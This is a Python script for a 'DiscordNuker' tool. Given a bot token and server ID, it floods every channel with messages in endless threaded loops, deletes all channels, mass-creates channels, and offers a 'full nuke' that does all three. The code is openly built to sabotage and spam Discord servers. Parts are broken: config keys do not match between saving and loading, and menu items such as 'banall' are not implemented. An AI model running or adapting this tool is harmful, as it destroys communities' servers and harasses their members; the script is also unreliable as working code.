import requests, os, random, json, sys, threading
from pystyle import Colors, Colorate, Write
from time import sleep

import requests
from time import sleep
import discord,os,json
from json import load
from discord.ext import commands
import socket
import random
import threading
from httpx import patch
from time import sleep
from colorama import Fore
from pystyle import Colors, Colorate
from pystyle import Colors, Colorate, Center
from pystyle import Colors, Colorate
os.system(f'cls & mode 85,20 & title Thaseac X #0000')
user = os.getlogin()
path = f'C:/Users/{user}/AppData/local/DiscordNuker'
filepath = f'C:/Users/{user}/AppData/local/DiscordNuker/config.json'
isExist = os.path.exists(path)
if isExist == False:
    print(path)
    os.makedirs(path)
def main():
    try: 
        with open(filepath) as config_file:
            configdata = json.load(config_file)
        token = configdata['TOKEN BOT'] 
        guild_id = configdata['GUILD ID'] 
        os.system("title PALALIGHT")
    except:
        print(Colorate.Vertical(Colors.rainbow, '''                                                                         
████████╗ ██████╗ ██╗  ██╗███████╗███╗   ██╗
╚══██╔══╝██╔═══██╗██║ ██╔╝██╔════╝████╗  ██║
   ██║   ██║   ██║█████╔╝ █████╗  ██╔██╗ ██║
   ██║   ██║   ██║██╔═██╗ ██╔══╝  ██║╚██╗██║
   ██║   ╚██████╔╝██║  ██╗███████╗██║ ╚████║
   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝
'''))
        bot_token = input(f"TOKEN BOT : ")
        guild_id = input(f"GUILD ID : ")
        jsondata = {
            "bot_token" : bot_token,
            "guild_id" : guild_id
            }
        savejson = json.dumps(jsondata)
        with open(filepath, 'w') as config_file:
            config_file.write(savejson)
    os.system('cls')
    os.system(f'cls & mode 85,20 & title Thaseac X #0000 ')
    print(Colorate.Vertical(Colors.rainbow, '''  
██████╗  █████╗ ██╗      █████╗ ██╗     ██╗ ██████╗ ██╗  ██╗████████╗
██╔══██╗██╔══██╗██║     ██╔══██╗██║     ██║██╔════╝ ██║  ██║╚══██╔══╝
██████╔╝███████║██║     ███████║██║     ██║██║  ███╗███████║   ██║   
██╔═══╝ ██╔══██║██║     ██╔══██║██║     ██║██║   ██║██╔══██║   ██║   
██║     ██║  ██║███████╗██║  ██║███████╗██║╚██████╔╝██║  ██║   ██║   
╚═╝     ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝   
'''))
    os.system("title Thaseac X #0000")
    user = os.getlogin( )
    print(Colorate.Horizontal(Colors.red_to_white, '''         
         ╔══════════════════════════════╗                                                                                              
         ║ [1] Spamwebhook              ║    
         ║ [2] deletechanel             ║        
         ║ [3] creatchanel              ║       
         ║ [4] dm everyone              ║     
         ║ [5] banall                   ║                                                     
         ╚══════════════════════════════╝
    '''))

    action = Write.Input(f"PLEASE SELECT : ", Colors.rainbow, interval=0.0000000)
    header = {
        'authorization': f'Bot {bot_token}',
    }

    def SpamRequest():
        channel_id = random.choice(channels_id)
        r = requests.post(f"https://discord.com/api/v9/channels/{channel_id}/messages", data=payload, headers=header)
    def DeleteChannel():
        r = requests.delete(f"https://discord.com/api/v9/channels/{channel_id}", headers=header)
    def CreateChannel():
        r = requests.post(f"https://discord.com/api/v9/guilds/{guild_id}/channels", json={"name": channelname, "permission_overwrites": [], "type": 0}, headers=header)


    if action == '1':
        os.system("title Thaseac X #0000")
        channel_ids = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=header)
        channels_id = [channel['id'] for channel in json.loads(channel_ids.text)]
        print(Colorate.Horizontal(Colors.rainbow, '\nWebhook Message', 1))
        message = Write.Input(f"\nMessage : ", Colors.rainbow, interval=0.00005)
        payload = {
            "content": message
        }
        print(Colorate.Horizontal(Colors.rainbow, f'\nWebhooks Spammer', 1))
        try:
         while True:
             t = threading.Thread(target=SpamRequest).start()
        except KeyboardInterrupt:
             os.system("python mininuker.py") 
             exit()           

    if action == '2':
        os.system("title Thaseac X #0000")
        channel_ids = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=header)
        channel_id = [channel['id'] for channel in json.loads(channel_ids.text)]
        print(Colorate.Horizontal(Colors.rainbow, '\n[SELECT] Delete Channels', 1))
        sleep(0)
        print(Colorate.Horizontal(Colors.rainbow, '\n[LOG] Delete Channels...', 1))
        for channel_id in channel_id:
            threading.Thread(target=DeleteChannel).start()
        print(Colorate.Horizontal(Colors.rainbow, f'\nSucceed', 1))
        sleep(2)
        main()   

    if action == '3':
        os.system("title Thaseac X #0000")
        print(Colorate.Horizontal(Colors.rainbow, '\nCreate Channels', 1))
        channelname = Write.Input(f"\nChannels Name : ", Colors.rainbow, interval=0.00005)
        channelsamount = int(Write.Input(f"Amount Channels : ", Colors.rainbow, interval=0.00005))
        sleep(0)
        print(Colorate.Horizontal(Colors.rainbow, f'\n[LOG] Creating {channelsamount} Create Channels', 1))
        for i in range(channelsamount):
            threading.Thread(target=CreateChannel).start()
        print(Colorate.Horizontal(Colors.rainbow, f'\nSucceed', 1))
        sleep(2)
        main()   

    if action == '4':
        os.system("title Thaseac X #0000")
        print(Colorate.Horizontal(Colors.purple_to_red, '\n[SELECT] Full Nuke'))
        channelsamount = int(Write.Input(f"\nAMOUNT CHANNELS : ", Colors.rainbow, interval=0.00005))
        channelname = Write.Input(f"CHANNELS NAME : ", Colors.rainbow, interval=0.00005)
        message = Write.Input(f"MESSAGE : ", Colors.rainbow, interval=0.00005)
        channel_ids = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=header)
        channel_id = [channel['id'] for channel in json.loads(channel_ids.text)]
        print(Colorate.Horizontal(Colors.rainbow, f'\n[LOG] Delenting All Channels', 1))
        for channel_id in channel_id:
            threading.Thread(target=DeleteChannel).start()
        sleep(3)
        print(Colorate.Horizontal(Colors.purple_to_red, f'[LOG] Creating ' + str(channelsamount) + ' Channels', 1))
        for i in range(channelsamount):
            threading.Thread(target=CreateChannel).start()
        payload = {
            "content": message
        }
        channel_ids = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=header)
        channels_id = [channel['id'] for channel in json.loads(channel_ids.text)]
        print(Colorate.Horizontal(Colors.purple_to_red, f'[LOG] Spamming', 1))
        print(Colorate.Horizontal(Colors.green_to_red, f'\n[INFO] Press ctrl+c to close', 1))
        try:
          while True:
                threading.Thread(target=SpamRequest).start()
        except KeyboardInterrupt:
             os.system("python mininuker.py") 
             exit()    

main() 
